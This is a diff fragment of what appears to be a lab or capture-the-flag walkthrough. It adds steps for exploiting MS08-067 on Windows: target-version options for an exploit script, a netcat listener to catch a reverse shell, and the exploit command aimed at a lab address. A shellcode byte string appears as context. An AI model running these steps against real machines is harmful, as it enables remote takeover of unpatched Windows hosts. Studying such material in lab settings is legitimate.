@@ -70,4 +70,30 @@ shellcode += "\xe7\xae\x11\x8f\x81\xd9\xc5\xa2\x92\xf8\x55\x1d"
 
 <p>Will take this shellcode into the script, and paste it in replacing the default.</p>
 
+### Guess Version
+
+The exploit requires the version of Windows and the Language pack:
+
+```
+Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
+Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
+Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
+Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
+Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
+Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
+Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)
+```
+
+### Run Exploit
+
+```
+nc -nlvp 443
+```
+
+```
+python3 exploit.py 10.129.134.210 6 445
+```
+![image](https://user-images.githubusercontent.com/66146701/199322582-c1530a6e-da3a-47f5-bc7c-de2d2adfa82d.png)
+
+![image](https://user-images.githubusercontent.com/66146701/199322800-3e1d2887-673d-4031-9926-724424d5b6c1.png)
 
